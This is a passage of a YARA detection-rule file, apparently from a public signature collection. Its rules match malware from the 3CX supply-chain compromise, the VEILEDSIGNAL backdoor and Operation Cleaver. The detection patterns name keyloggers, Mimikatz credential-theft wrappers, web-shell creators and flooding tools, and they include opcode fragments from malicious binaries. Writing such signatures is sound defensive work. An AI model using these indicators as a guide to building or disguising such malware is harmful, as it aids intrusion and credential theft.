		$opb3 = { 48 FF C2 66 44 39 2C 56 75 ?? 4C 8D 4C 24 ?? 45 33 C0 48 8B CE FF 15 ?? ?? ?? ?? 85 C0 0F 84 ?? ?? ?? ?? 44 0F B7 44 24 ?? 33 F6 48 8B 54 24 ?? 45 33 C9 48 8B 0B 48 89 74 24 ?? 89 74 24 ?? C7 44 24 ?? ?? ?? ?? ?? 48 89 74 24 ?? FF 15 }
		$opb4 = { 33 C0 48 8D 6B ?? 4C 8D 4C 24 ?? 89 44 24 ?? BA ?? ?? ?? ?? 48 89 44 24 ?? 48 8B CD 89 44 24 ?? 44 8D 40 ?? 8B F8 FF 15}

	condition:
		( all of ( $opa* ) ) or ( 1 of ( $opa* ) and 1 of ( $opb* ) ) or ( 3 of ( $opb* ) )
}

rule SIGNATURE_BASE_SUSP_APT_MAL_NK_3CX_Malicious_Samples_Mar23_1
{
	meta:
		description = "Detects marker found in malicious DLLs related to 3CX compromise"
		author = "X__Junior, Florian Roth (Nextron Systems)"
		id = "9fc6eb94-d02f-5bcd-9f55-b6c6a8301b4f"
		date = "2023-03-29"
		modified = "2023-04-20"
		reference = "https://www.reddit.com/r/crowdstrike/comments/125r3uu/20230329_situational_awareness_crowdstrike/"
		source_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/yara/gen_mal_3cx_compromise_mar23.yar#L81-L98"
		license_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/LICENSE"
		logic_hash = "dcce1f5e769a2821d746a960cd333f8042fb71c8469aa41c29bbbd0dce79369c"
		score = 75
		quality = 85
		tags = ""
		hash1 = "7986bbaee8940da11ce089383521ab420c443ab7b15ed42aed91fd31ce833896"
		hash2 = "c485674ee63ec8d4e8fde9800788175a8b02d3f9416d0e763360fff7f8eb4e02"
		hash3 = "cc4eedb7b1f77f02b962f4b05278fa7f8082708b5a12cacf928118520762b5e2"

	strings:
		$opx1 = { 41 80 7C 00 FD FE 75 ?? 41 80 7C 00 FE ED 75 ?? 41 80 7C 00 FF FA 75 ?? 41 80 3C 00 CE }
		$opx2 = { 80 78 ?? FE 75 ?? 80 78 ?? ED 75 ?? 80 38 FA 75 ?? 80 78 ?? CE }

	condition:
		1 of them
}

rule SIGNATURE_BASE_APT_MAL_Macos_NK_3CX_DYLIB_Mar23_1
{
	meta:
		description = "Detects malicious DYLIB files related to 3CX compromise"
		author = "Florian Roth (Nextron Systems)"
		id = "a19904d3-9b2d-561f-b734-20bf09584fa7"
		date = "2023-03-30"
		modified = "2023-12-05"
		reference = "https://www.sentinelone.com/blog/smoothoperator-ongoing-campaign-trojanizes-3cx-software-in-software-supply-chain-attack/"
		source_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/yara/gen_mal_3cx_compromise_mar23.yar#L188-L214"
		license_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/LICENSE"
		logic_hash = "e52c76de1e995cc7084ddb390b60f4bc66e5bdf89aaa28ef3fd70578ed3145a6"
		score = 80
		quality = 85
		tags = ""
		hash1 = "a64fa9f1c76457ecc58402142a8728ce34ccba378c17318b3340083eeb7acc67"
		hash2 = "fee4f9dabc094df24d83ec1a8c4e4ff573e5d9973caa676f58086c99561382d7"

	strings:
		$xc1 = { 37 15 00 13 16 16 1B 55 4F 54 4A 5A 52 2D 13 14 
               1E 15 0D 09 5A 34 2E 5A 4B 4A 54 4A 41 5A 2D 13
               14 4C 4E 41 5A 02 4C 4E 53 5A 3B 0A 0A 16 1F 2D
               1F 18 31 13 0E 55 4F 49 4D 54 49 4C 5A 52 31 32
               2E 37 36 56 5A 16 13 11 1F 5A 3D 1F 19 11 15 53
               5A 39 12 08 15 17 1F 55 4B 4A 42 54 4A 54 4F 49
               4F 43 54 4B 48 42 5A 29 1B 1C 1B 08 13 55 4F 49
               4D 54 49 4C 7A }
		$xc2 = { 41 49 19 02 25 1b 0f 0e 12 25 0e 15 11 1f 14 25 19 15 14 0e 1f 14 0e 47 5f 09 41 25 25 0e 0f 0e 17 1b 47 }
		$xc3 = { 55 29 03 09 0e 1f 17 55 36 13 18 08 1b 08 03 55 39 15 08 1f 29 1f 08 0c 13 19 1f 09 55 29 03 09 0e 1f 17 2c 1f 08 09 13 15 14 54 0a 16 13 09 0e }

	condition:
		1 of them
}

rule SIGNATURE_BASE_APT_SUSP_NK_3CX_Malicious_Samples_Mar23_1
{
	meta:
		description = "Detects indicator (event name) found in samples related to 3CX compromise"
		author = "Florian Roth (Nextron Systems)"
		id = "b233846a-19df-579b-a674-233d66824008"
		date = "2023-03-30"
		modified = "2023-12-05"
		reference = "https://www.sentinelone.com/blog/smoothoperator-ongoing-campaign-trojanizes-3cx-software-in-software-supply-chain-attack/"
		source_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/yara/gen_mal_3cx_compromise_mar23.yar#L216-L232"
		license_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/LICENSE"
		logic_hash = "6ab8a4ac184eaba6eb56bfc49d6fa03f9b0877d75294aa9a242e9ac96482fab0"
		score = 70
		quality = 85
		tags = ""
		hash1 = "7986bbaee8940da11ce089383521ab420c443ab7b15ed42aed91fd31ce833896"
		hash2 = "59e1edf4d82fae4978e97512b0331b7eb21dd4b838b850ba46794d9c7a2c0983"
		hash3 = "aa124a4b4df12b34e74ee7f6c683b2ebec4ce9a8edcf9be345823b4fdcf5d868"
		hash4 = "c485674ee63ec8d4e8fde9800788175a8b02d3f9416d0e763360fff7f8eb4e02"

	strings:
		$a1 = "AVMonitorRefreshEvent" wide fullword

	condition:
		1 of them
}

rule SIGNATURE_BASE_APT_MAL_NK_3CX_Malicious_Samples_Mar23_4
{
	meta:
		description = "Detects decrypted payload loaded inside 3CXDesktopApp.exe which downloads info stealer"
		author = "MalGamy (Nextron Systems)"
		id = "d11170df-570c-510c-80ec-39048acd0fbd"
		date = "2023-03-29"
		modified = "2023-12-05"
		reference = "https://twitter.com/WhichbufferArda/status/1641404343323688964?s=20"
		source_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/yara/gen_mal_3cx_compromise_mar23.yar#L234-L249"
		license_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/LICENSE"
		hash = "851c2c99ebafd4e5e9e140cfe3f2d03533846ca16f8151ae8ee0e83c692884b7"
		logic_hash = "2fd56527a094b1f155cf33af402328835d4fb8aee9a058742d3e3763acef9e46"
		score = 80
		quality = 85
		tags = ""

	strings:
		$op1 = {41 69 D0 [4] 8B C8 C1 E9 ?? 33 C1 8B C8 C1 E1 ?? 81 C2 [4] 33 C1 43 8D 0C 02 02 C8 49 C1 EA ?? 41 88 0B 8B C8 C1 E1 ?? 33 C1 44 69 C2 [4] 8B C8 C1 E9 ?? 33 C1 8B C8 C1 E1 ?? 41 81 C0 [4] 33 C1 4C 0F AF CF 4D 03 CA 45 8B D1 4C 0F AF D7 41 8D 0C 11 49 C1 E9 ?? 02 C8}
		$op2 = {4D 0F AF CC 44 69 C2 [4] 4C 03 C9 45 8B D1 4D 0F AF D4 41 8D 0C 11 41 81 C0 [4] 02 C8 49 C1 E9 ?? 41 88 4B ?? 4D 03 D1 8B C8 45 8B CA C1 E1 ?? 33 C1}
		$op3 = {33 C1 4C 0F AF C7 8B C8 C1 E1 ?? 4D 03 C2 33 C1}

	condition:
		2 of them
}

rule SIGNATURE_BASE_APT_MAL_VEILEDSIGNAL_Backdoor_Apr23_2
{
	meta:
		description = "Detects malicious VEILEDSIGNAL backdoor"
		author = "X__Junior"
		id = "ff1fa0bd-19b7-553a-9506-bc5aa5d29056"
		date = "2023-04-29"
		modified = "2023-12-05"
		reference = "https://symantec-enterprise-blogs.security.com/blogs/threat-intelligence/xtrader-3cx-supply-chain"
		source_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/yara/gen_mal_3cx_compromise_mar23.yar#L373-L392"
		license_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/LICENSE"
		hash = "c4887a5cd6d98e273ba6e9ea3c1d8f770ef26239819ea24a1bfebd81d6870505"
		logic_hash = "a15f7f06be5e620baf33d595afc35246dae0307978984af832940a74ef2c84eb"
		score = 80
		quality = 85
		tags = ""

	strings:
		$sa1 = "\\.\\pipe\\gecko.nativeMessaging" ascii
		$sa2 = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.54 Safari/537.36 Edg/95.0.1020.40" ascii
		$sa3 = "application/json, text/javascript, */*; q=0.01" ascii
		$op1 = { 89 7? 24 ?? 44 8B CD 4C 8B C? 48 89 44 24 ?? 33 D2 33 C9 FF 15}
		$op2 = { 4C 8B CB 4C 89 74 24 ?? 4C 8D 05 ?? ?? ?? ?? 44 89 74 24 ?? 33 D2 33 C9 FF 15}
		$op3 = { 48 89 74 24 ?? 45 33 C0 89 74 24 ?? 41 B9 ?? ?? ?? ?? 89 74 24 ?? 48 8B D8 48 C7 00 ?? ?? ?? ?? 48 8B 0F 41 8D 50 ?? 48 89 44 24 ?? 89 74 24 ?? FF 15}

	condition:
		all of ( $op* ) or all of ( $sa* )
}

rule SIGNATURE_BASE_APT_MAL_VEILEDSIGNAL_Backdoor_Apr23_3
{
	meta:
		description = "Detects malicious VEILEDSIGNAL backdoor"
		author = "X__Junior"
		id = "6b6f984e-242a-5b84-baa9-6311992cde9b"
		date = "2023-04-29"
		modified = "2023-12-05"
		reference = "https://symantec-enterprise-blogs.security.com/blogs/threat-intelligence/xtrader-3cx-supply-chain"
		source_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/yara/gen_mal_3cx_compromise_mar23.yar#L394-L410"
		license_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/LICENSE"
		hash = "595392959b609caf088d027a23443cf2fefd043607ccdec3de19ad3bb43a74b1"
		logic_hash = "58f860926db4a7dfefbd39ee35efaa0081b7e31a361efce02f5144266ab652a6"
		score = 80
		quality = 85
		tags = ""

	strings:
		$op1 = { 4C 8B CB 4C 89 74 24 ?? 4C 8D 05 ?? ?? ?? ?? 44 89 74 24 ?? 33 D2 33 C9 FF 15}
		$op2 = { 89 7? 24 ?? 44 8B CD 4C 8B C? 48 89 44 24 ?? 33 D2 33 C9 FF 15}
		$op3 = { 8B 54 24 ?? 4C 8D 4C 24 ?? 45 8D 46 ?? 44 89 74 24 ?? 48 8B CB FF 15}
		$op4 = { 48 8D 44 24 ?? 45 33 C9 41 B8 01 00 00 40 48 89 44 24 ?? 41 8B D5 48 8B CF FF 15}

	condition:
		all of them
}

rule SIGNATURE_BASE_APT_MAL_VEILEDSIGNAL_Backdoor_Apr23_4
{
	meta:
		description = "Detects malicious VEILEDSIGNAL backdoor"
		author = "X__Junior"
		id = "77340ec0-36bb-5c47-995f-4e6f76b68fe1"
		date = "2023-04-29"
		modified = "2023-12-05"
		reference = "https://symantec-enterprise-blogs.security.com/blogs/threat-intelligence/xtrader-3cx-supply-chain"
		source_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/yara/gen_mal_3cx_compromise_mar23.yar#L412-L428"
		license_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/LICENSE"
		hash = "9b0761f81afb102bb784b398b16faa965594e469a7fcfdfd553ced19cc17e70b"
		logic_hash = "ad22df404d948073428fc35b0c8fbfea25da3bc66e46ea6397ff751ae65d5939"
		score = 80
		quality = 85
		tags = ""

	strings:
		$op1 = { 48 8D 15 ?? ?? ?? ?? 48 8D 4C 24 ?? E8 ?? ?? ?? ?? 85 C0 74 ?? 48 8D 15 ?? ?? ?? ?? 48 8D 4C 24 ?? E8 ?? ?? ?? ?? 85 C0 74 ?? 48 8D 15 ?? ?? ?? ?? 48 8D 4C 24 ?? E8 ?? ?? ?? ?? 85 C0 }
		$op2 = { 48 8B C8 48 8D 15 ?? ?? ?? ?? FF 15 ?? ?? ?? ?? 45 33 C0 4C 8D 4D ?? B2 01 41 8D 48 ?? FF D0}
		$op3 = { 33 FF C7 44 24 ?? 38 02 00 00 33 D2 8D 4F ?? FF 15 ?? ?? ?? ?? 48 8B D8 48 83 F8 FF 74 ?? 48 8D 54 24 ?? 48 8B C8 FF 15 }
		$op4 = { 4C 8D 05 ?? ?? ?? ?? 48 89 4C 24 ?? 4C 8B C8 33 D2 89 4C 24 ?? FF 15 }

	condition:
		all of them
}

rule SIGNATURE_BASE_OPCLEAVER_Backdoorlogger
{
	meta:
		description = "Keylogger used by attackers in Operation Cleaver"
		author = "Cylance Inc."
		id = "e9149baa-83c0-597f-833c-ea0241bb60e6"
		date = "2014-12-02"
		modified = "2023-12-05"
		reference = "http://cylance.com/assets/Cleaver/Cylance_Operation_Cleaver_Report.pdf"
		source_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/yara/apt_op_cleaver.yar#L3-L17"
		license_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/LICENSE"
		logic_hash = "c7716b21e85d7e9fb1e1503071c6cd7dc2f4713051e0b03013e3d123a0d800a6"
		score = 70
		quality = 85
		tags = ""

	strings:
		$s1 = "BackDoorLogger"
		$s2 = "zhuAddress"

	condition:
		all of them
}

rule SIGNATURE_BASE_OPCLEAVER_Jasus
{
	meta:
		description = "ARP cache poisoner used by attackers in Operation Cleaver"
		author = "Cylance Inc."
		id = "8e04b258-e071-5974-9778-b9d0b97be8d5"
		date = "2014-12-02"
		modified = "2023-12-05"
		reference = "http://cylance.com/assets/Cleaver/Cylance_Operation_Cleaver_Report.pdf"
		source_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/yara/apt_op_cleaver.yar#L19-L34"
		license_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/LICENSE"
		logic_hash = "7d6cd7f0f264a0bfdc6af422baa1a0e257cb8f4c39a2cb27a1edaf70201e8564"
		score = 70
		quality = 85
		tags = ""

	strings:
		$s1 = "pcap_dump_open"
		$s2 = "Resolving IPs to poison..."
		$s3 = "WARNNING: Gateway IP can not be found"

	condition:
		all of them
}

rule SIGNATURE_BASE_OPCLEAVER_Loggermodule
{
	meta:
		description = "Keylogger used by attackers in Operation Cleaver"
		author = "Cylance Inc."
		id = "949e7ff4-2102-5c89-83c9-f7ba64745661"
		date = "2014-12-02"
		modified = "2023-12-05"
		reference = "http://cylance.com/assets/Cleaver/Cylance_Operation_Cleaver_Report.pdf"
		source_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/yara/apt_op_cleaver.yar#L36-L50"
		license_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/LICENSE"
		logic_hash = "dd937bc3fc7054874a3c61bbef859dd8a8ec37872a30be6d3e1776957f98db80"
		score = 70
		quality = 85
		tags = ""

	strings:
		$s1 = "%s-%02d%02d%02d%02d%02d.r"
		$s2 = "C:\\Users\\%s\\AppData\\Cookies\\"

	condition:
		all of them
}

rule SIGNATURE_BASE_OPCLEAVER_Netc
{
	meta:
		description = "Net Crawler used by attackers in Operation Cleaver"
		author = "Cylance Inc."
		id = "68f32662-0d7d-5dfa-8bfd-ca41d383e19c"
		date = "2014-12-02"
		modified = "2023-12-05"
		reference = "http://cylance.com/assets/Cleaver/Cylance_Operation_Cleaver_Report.pdf"
		source_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/yara/apt_op_cleaver.yar#L52-L66"
		license_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/LICENSE"
		logic_hash = "7da739c33da91f07e9e35ceab88a37477372998b4cf4b692b8d26cd1a4d936de"
		score = 70
		quality = 85
		tags = ""

	strings:
		$s1 = "NetC.exe" wide
		$s2 = "Net Service"

	condition:
		all of them
}

rule SIGNATURE_BASE_OPCLEAVER_Shellcreator2
{
	meta:
		description = "Shell Creator used by attackers in Operation Cleaver to create ASPX web shells"
		author = "Cylance Inc."
		id = "b62336c3-39e5-55f8-98df-6c2a2cb0764a"
		date = "2014-12-02"
		modified = "2023-12-05"
		reference = "http://cylance.com/assets/Cleaver/Cylance_Operation_Cleaver_Report.pdf"
		source_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/yara/apt_op_cleaver.yar#L68-L82"
		license_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/LICENSE"
		logic_hash = "5422cf4e4809c1183c3c9870d9a5ddcf806082d8cae81a014255f5f18576101d"
		score = 70
		quality = 85
		tags = ""

	strings:
		$s1 = "ShellCreator2.Properties"
		$s2 = "set_IV"

	condition:
		all of them
}

rule SIGNATURE_BASE_OPCLEAVER_Smartcopy2
{
	meta:
		description = "Malware or hack tool used by attackers in Operation Cleaver"
		author = "Cylance Inc."
		id = "898d9060-208a-5dfb-a452-50ab49b80a9d"
		date = "2014-12-02"
		modified = "2023-12-05"
		reference = "http://cylance.com/assets/Cleaver/Cylance_Operation_Cleaver_Report.pdf"
		source_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/yara/apt_op_cleaver.yar#L84-L98"
		license_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/LICENSE"
		logic_hash = "5b83588fa80558cd387511d38e9d1c51c488216b9cd27e848d8bdc59cd8ce348"
		score = 70
		quality = 85
		tags = ""

	strings:
		$s1 = "SmartCopy2.Properties"
		$s2 = "ZhuFrameWork"

	condition:
		all of them
}

rule SIGNATURE_BASE_OPCLEAVER_Synflooder
{
	meta:
		description = "Malware or hack tool used by attackers in Operation Cleaver"
		author = "Cylance Inc."
		id = "bdaf02f4-1226-569b-9f55-999be7ff397a"
		date = "2014-12-02"
		modified = "2023-12-05"
		reference = "http://cylance.com/assets/Cleaver/Cylance_Operation_Cleaver_Report.pdf"
		source_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/yara/apt_op_cleaver.yar#L100-L115"
		license_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/LICENSE"
		logic_hash = "b5349931c4eb5733f9bf05e7cfac6a434063a01d802665f70384cb29d9ae2a3d"
		score = 70
		quality = 85
		tags = ""

	strings:
		$s1 = "Unable to resolve [ %s ]. ErrorCode %d"
		$s2 = "s IP is : %s"
		$s3 = "Raw TCP Socket Created successfully."

	condition:
		all of them
}

rule SIGNATURE_BASE_OPCLEAVER_Tinyzbot
{
	meta:
		description = "Tiny Bot used by attackers in Operation Cleaver"
		author = "Cylance Inc."
		id = "4fad21a6-a900-5afb-876d-99a6d93e0c2c"
		date = "2014-12-02"
		modified = "2023-12-05"
		reference = "http://cylance.com/assets/Cleaver/Cylance_Operation_Cleaver_Report.pdf"
		source_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/yara/apt_op_cleaver.yar#L117-L138"
		license_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/LICENSE"
		logic_hash = "fdc41fbec71602e13105a03a4f44319a139018bda00e87e8f4d9b5e2f6269c14"
		score = 70
		quality = 85
		tags = ""

	strings:
		$s1 = "NetScp" wide
		$s2 = "TinyZBot.Properties.Resources.resources"
		$s3 = "Aoao WaterMark"
		$s4 = "Run_a_exe"
		$s5 = "netscp.exe"
		$s6 = "get_MainModule_WebReference_DefaultWS"
		$s7 = "remove_CheckFileMD5Completed"
		$s8 = "http://tempuri.org/"
		$s9 = "Zhoupin_Cleaver"

	condition:
		(( $s1 and $s2 ) or ( $s3 and $s4 and $s5 ) or ( $s6 and $s7 and $s8 ) or $s9 )
}

rule SIGNATURE_BASE_OPCLEAVER_Zhoupinexploitcrew
{
	meta:
		description = "Keywords used by attackers in Operation Cleaver"
		author = "Cylance Inc."
		id = "4e7457a0-e6e1-535c-b04b-ad313b496ce1"
		date = "2014-12-02"
		modified = "2023-12-05"
		reference = "http://cylance.com/assets/Cleaver/Cylance_Operation_Cleaver_Report.pdf"
		source_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/yara/apt_op_cleaver.yar#L140-L154"
		license_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/LICENSE"
		logic_hash = "1541f1ebc026d3eaf9b62150085415d12523ee1395fb8cf7ade8608a1b0a11b6"
		score = 70
		quality = 85
		tags = ""

	strings:
		$s1 = "zhoupin exploit crew" nocase
		$s2 = "zhopin exploit crew" nocase

	condition:
		1 of them
}

rule SIGNATURE_BASE_OPCLEAVER_Antivirusdetector
{
	meta:
		description = "Hack tool used by attackers in Operation Cleaver"
		author = "Cylance Inc."
		id = "25ab4eaf-eae7-5a55-bed4-42f621d5f06c"
		date = "2014-12-02"
		modified = "2023-12-05"
		reference = "http://cylance.com/assets/Cleaver/Cylance_Operation_Cleaver_Report.pdf"
		source_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/yara/apt_op_cleaver.yar#L156-L171"
		license_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/LICENSE"
		logic_hash = "9a8c2bbd27efab4c5579ea143abbd2f71c477dfd0ddbfb1741359e4d34140d9b"
		score = 70
		quality = 85
		tags = ""

	strings:
		$s1 = "getShadyProcess"
		$s2 = "getSystemAntiviruses"
		$s3 = "AntiVirusDetector"

	condition:
		all of them
}

rule SIGNATURE_BASE_OPCLEAVER_Csext
{
	meta:
		description = "Backdoor used by attackers in Operation Cleaver"
		author = "Cylance Inc."
		id = "f865eae5-9988-5533-a004-e1694761a557"
		date = "2014-12-02"
		modified = "2023-12-05"
		reference = "http://cylance.com/assets/Cleaver/Cylance_Operation_Cleaver_Report.pdf"
		source_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/yara/apt_op_cleaver.yar#L173-L188"
		license_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/LICENSE"
		logic_hash = "b4d070b71b685608ab84e757d01293749f2c017a6cd5b6ade6591264adc9836b"
		score = 70
		quality = 85
		tags = ""

	strings:
		$s1 = "COM+ System Extentions"
		$s2 = "csext.exe"
		$s3 = "COM_Extentions_bin"

	condition:
		all of them
}

rule SIGNATURE_BASE_OPCLEAVER_Kagent
{
	meta:
		description = "Backdoor used by attackers in Operation Cleaver"
		author = "Cylance Inc."
		id = "32d20495-eeed-5b2b-915d-cad60fa991f6"
		date = "2014-12-02"
		modified = "2023-12-05"
		reference = "http://cylance.com/assets/Cleaver/Cylance_Operation_Cleaver_Report.pdf"
		source_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/yara/apt_op_cleaver.yar#L190-L204"
		license_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/LICENSE"
		logic_hash = "bd72ade7d40db830dc980def5107261f9cb41b713f9a0a1b2f41f7658b31653e"
		score = 70
		quality = 85
		tags = ""

	strings:
		$s1 = "kill command is in last machine, going back"
		$s2 = "message data length in B64: %d Bytes"

	condition:
		all of them
}

rule SIGNATURE_BASE_OPCLEAVER_Mimikatzwrapper
{
	meta:
		description = "Mimikatz Wrapper used by attackers in Operation Cleaver"
		author = "Cylance Inc."
		id = "e9427e29-e581-5a5b-8f1d-4b9bfeec0946"
		date = "2014-12-02"
		modified = "2023-12-05"
		reference = "http://cylance.com/assets/Cleaver/Cylance_Operation_Cleaver_Report.pdf"
		source_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/yara/apt_op_cleaver.yar#L206-L220"
		license_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/LICENSE"
		logic_hash = "c643e248a9d8dd653ec99f8b59cdc7af945857a6a0321f93cc6983e85f84baba"
		score = 70
		quality = 85
		tags = ""

	strings:
		$s1 = "mimikatzWrapper"
		$s2 = "get_mimikatz"

	condition:
		all of them
}

rule SIGNATURE_BASE_OPCLEAVER_Pvz_In
{
	meta:
		description = "Parviz tool used by attackers in Operation Cleaver"
		author = "Cylance Inc."
		id = "dede12b3-f1dd-58ba-a860-829b2331b740"
		date = "2014-12-02"
		modified = "2023-12-05"
		reference = "http://cylance.com/assets/Cleaver/Cylance_Operation_Cleaver_Report.pdf"
		source_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/yara/apt_op_cleaver.yar#L222-L236"
		license_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/LICENSE"
		logic_hash = "eae778162be5dcfa0005bb237c5209e7103db3549e06706744f9ebdf04e192df"
		score = 70
		quality = 85
		tags = ""

	strings:
		$s1 = "LAST_TIME=00/00/0000:00:00PM$"
		$s2 = "if %%ERRORLEVEL%% == 1 GOTO line"

	condition:
		all of them
}

rule SIGNATURE_BASE_OPCLEAVER_Pvz_Out
{
	meta:
		description = "Parviz tool used by attackers in Operation Cleaver"
		author = "Cylance Inc."
		id = "46b51bff-dfd9-5f56-897c-422112bc837b"
		date = "2014-12-02"
		modified = "2023-12-05"
		reference = "http://cylance.com/assets/Cleaver/Cylance_Operation_Cleaver_Report.pdf"
		source_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/yara/apt_op_cleaver.yar#L238-L252"
		license_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/LICENSE"
		logic_hash = "849300c32d2df42a011386903495d271810fd8a40c76d1a0c6295c059deb3a05"
		score = 70
		quality = 85
		tags = ""

	strings:
		$s1 = "Network Connectivity Module" wide
		$s2 = "OSPPSVC" wide

	condition:
		all of them
}

rule SIGNATURE_BASE_OPCLEAVER_Wndtest
{
	meta:
		description = "Backdoor used by attackers in Operation Cleaver"
		author = "Cylance Inc."
		id = "f8daa0a8-f0f0-5bf7-b9ab-eaf5335ff2b9"
		date = "2014-12-02"
		modified = "2023-12-05"
		reference = "http://cylance.com/assets/Cleaver/Cylance_Operation_Cleaver_Report.pdf"
		source_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/yara/apt_op_cleaver.yar#L254-L269"
		license_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/LICENSE"
		logic_hash = "3b29c2b92b816bd0559695cb6b0b6e050ca8c5e256ec92448535fe9edf20757f"
		score = 70
		quality = 85
		tags = ""

	strings:
		$s1 = "[Alt]" wide
		$s2 = "<< %s >>:" wide
		$s3 = "Content-Disposition: inline; comp=%s; account=%s; product=%d;"

	condition:
		all of them
}

rule SIGNATURE_BASE_OPCLEAVER_Zhcat
{
	meta:
		description = "Network tool used by Iranian hackers and used by attackers in Operation Cleaver"
		author = "Cylance Inc."
		id = "e1f1bc48-b895-5e23-8ffd-b6ea9c8eb26f"
		date = "2014-12-02"
		modified = "2023-12-05"
		reference = "http://cylance.com/assets/Cleaver/Cylance_Operation_Cleaver_Report.pdf"
		source_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/yara/apt_op_cleaver.yar#L271-L285"
		license_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/LICENSE"
		logic_hash = "ef5112532ba62cb2cf6a1c62b344d9146c5b8e2da50990c8cfd60d91b99bcb5e"
		score = 70
		quality = 85
		tags = ""

	strings:
		$s1 = "Mozilla/4.0 ( compatible; MSIE 7.0; AOL 8.0 )" ascii fullword
		$s2 = "ABC ( A Big Company )" wide fullword

	condition:
		all of them
}

rule SIGNATURE_BASE_OPCLEAVER_Zhlookup
{
	meta:
		description = "Hack tool used by attackers in Operation Cleaver"
		author = "Cylance Inc."
		id = "45ef9a90-db4c-59c3-b694-da3f539b118b"
		date = "2014-12-02"
		modified = "2023-12-05"
		reference = "http://cylance.com/assets/Cleaver/Cylance_Operation_Cleaver_Report.pdf"
		source_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/yara/apt_op_cleaver.yar#L287-L300"
		license_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/LICENSE"
		logic_hash = "9cc476e016708fd1604a63e2391057dc9dd0865448b62742ec596d6de54bf8f6"
		score = 70
		quality = 85
		tags = ""

	strings:
		$s1 = "zhLookUp.Properties"

	condition:
		all of them
}

rule SIGNATURE_BASE_OPCLEAVER_Zhmimikatz
{
	meta:
		description = "Mimikatz wrapper used by attackers in Operation Cleaver"
		author = "Cylance Inc."
		id = "fba8ab6e-3b61-53a1-b4df-178442e3cf24"
		date = "2014-12-02"
		modified = "2023-12-05"
